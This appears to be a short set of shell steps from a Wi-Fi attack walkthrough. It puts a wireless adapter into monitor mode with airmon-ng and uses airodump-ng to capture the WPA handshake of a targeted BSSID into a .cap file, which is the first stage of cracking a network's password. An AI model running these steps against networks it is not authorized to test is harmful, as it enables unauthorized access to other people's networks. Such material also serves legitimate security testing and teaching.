# 1. Identify Interface
iwconfig

# 2. Put Adapter in Monitor Mode
sudo airmon-ng start wlan0
# Airmon-ng output confirms the new name is wlan0mon

# 3. Scan for Target (optional, assuming you know the BSSID from prior scans)
# sudo airodump-ng wlan0mon

# 4. Isolate Target and Capture Handshake
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 11 -w handshake_capture wlan0mon
# Let this run. A file named 'handshake_capture-01.cap' will be created.
